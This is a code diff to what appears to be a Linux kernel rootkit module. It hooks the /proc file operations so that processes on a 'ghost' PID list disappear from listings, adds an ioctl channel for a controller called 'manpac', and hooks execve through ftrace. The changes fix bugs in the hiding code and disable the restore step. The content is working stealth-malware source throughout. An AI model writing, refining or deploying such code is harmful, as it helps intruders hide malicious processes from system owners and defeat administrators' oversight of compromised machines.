@@ -51,6 +51,11 @@ static asmlinkage long
 		const char __user *const __user *argv,
 		const char __user *const __user *envp);
 
+// Pointer to original /proc fop->iterate_shared
+// Signature based on <linux/fs.h>
+static asmlinkage int
+(*original_iterate_shared)(struct file *file, struct dir_context *ctx);
+
 // ftrace options (includes handler)
 static struct ftrace_ops execve_ops;
 
@@ -173,7 +178,7 @@ static const struct file_operations *original_proc_fop;
 // Original /proc ctx
 static struct dir_context *original_proc_ctx;
 // Mutated /proc fops
-static struct file_operations proc_fop;
+static struct file_operations *proc_fop;
 
 // Wrapped /proc filldir that ignores Ghost PIDs
 static int
@@ -182,22 +187,22 @@ proc_filldir(struct dir_context *ctx, const char *name, int namlen,
 {
 	int error, i;
 	unsigned long pid;
-	if ((error = kstrtoul(name, 10, &pid)))
-	{
-		pr_debug("pr_fd - failed to convert to int\n");
-		return error;
-	}
+	error = kstrtoul(name, 10, &pid);
 
-	for (i = 0; i < 4; i++)
+	if (!error) // Have PID
 	{
-		if (ghost_pids[i] == pid)
+		for (i = 0; i < 4; i++)
 		{
-			return 0; // Finish before entry is returned
+			if (ghost_pids[i] == pid)
+			{
+				return 0; // Finish before entry is returned
+			}
 		}
 	}
 
 	// Call original filldir
-	return original_proc_ctx->actor(ctx, name, namlen, offset, ino, d_type);
+	return original_proc_ctx->actor(original_proc_ctx, name, namlen,
+			offset, ino, d_type);
 }
 
 // Wrapped /proc iterate_shared that calls wrapped proc_fill_dir
@@ -205,16 +210,14 @@ static int
 proc_iterate_shared(struct file *file, struct dir_context *ctx)
 {
 	int error;
-	struct dir_context proc_ctx = {
-		.actor = proc_filldir,
-		.pos = ctx->pos
+	static struct dir_context proc_ctx = {
+		.actor = proc_filldir
 	};
 
+	proc_ctx.pos = ctx->pos;
 	original_proc_ctx = ctx; // Store pointer to original for wrapper
-
-	error = original_proc_fop->iterate_shared(file, &proc_ctx);
-	ctx->pos = proc_ctx.pos; // Update next position from result
-
+	error = original_iterate_shared(file, &proc_ctx);
+	ctx->pos = proc_ctx.pos;
 	return error;
 }
 
@@ -264,7 +267,7 @@ unhide_pid(unsigned long pid)
 	}
 
 	// No ghosts remaining, restore to normal
-	restore();
+	//restore();
 }
 
 // ioctl on /proc, receives signals from manpac
@@ -298,11 +301,17 @@ install_proc_fop(void)
 	}
 
 	original_proc_fop = path.dentry->d_inode->i_fop; // Pointer to original /proc fop
-	proc_fop = *original_proc_fop; // Clone original /proc fop
-	proc_fop.iterate_shared = proc_iterate_shared; // Wrap /proc iterate_shared
-	proc_fop.unlocked_ioctl = proc_ioctl; // Add ioctl to /proc
+	original_iterate_shared = original_proc_fop->iterate_shared; // Pointer to original iterate_shared
+	proc_fop = kmemdup(original_proc_fop, sizeof(struct file_operations), GFP_KERNEL); // Clone original /proc fop
+	if (!proc_fop)
+	{
+		pr_debug("pr_fop i - failed to clone /proc fop");
+		return;
+	}
+	proc_fop->iterate_shared = proc_iterate_shared; // Wrap /proc iterate_shared
+	proc_fop->unlocked_ioctl = proc_ioctl; // Add ioctl to /proc
 
-	path.dentry->d_inode->i_fop = &proc_fop; // Install fop
+	path.dentry->d_inode->i_fop = proc_fop; // Install fop
 }
 
 // Restores fops on /proc
@@ -317,6 +326,10 @@ restore_proc_fop(void)
 	}
 
 	path.dentry->d_inode->i_fop = original_proc_fop; // Restore fop
+
+	if (proc_fop) { // Free cloned /proc fop
+		kfree(proc_fop);
+	}
 }
 
 /* Install/Restore */
